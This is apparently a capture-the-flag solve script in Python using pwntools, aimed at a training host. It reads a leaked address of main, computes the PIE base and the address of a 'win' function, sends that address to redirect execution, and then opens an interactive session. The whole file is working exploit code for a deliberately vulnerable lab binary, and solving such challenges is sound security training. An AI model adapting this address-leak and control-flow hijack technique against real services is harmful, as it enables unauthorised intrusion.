#!/usr/bin/env python3
from pwn import *

HOST = "chatelaine.cylabacademy.net"
PORT = 30077

context.binary = elf = ELF("./vuln", checksec=False)
context.log_level = "info"


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"Address of main: ")

    main_leak = int(io.recvline().strip(), 16)
    log.success(f"Remote main: {main_leak:#x}")

    pie_base = main_leak - elf.sym["main"]
    win_addr = pie_base + elf.sym["win"]

    log.info(f"PIE base : {pie_base:#x}")
    log.success(f"Win addr : {win_addr:#x}")

    io.sendlineafter(
        b"Enter the address to jump to, ex => 0x12345: ",
        hex(win_addr).encode()
    )

    io.interactive()


if __name__ == "__main__":
    main()
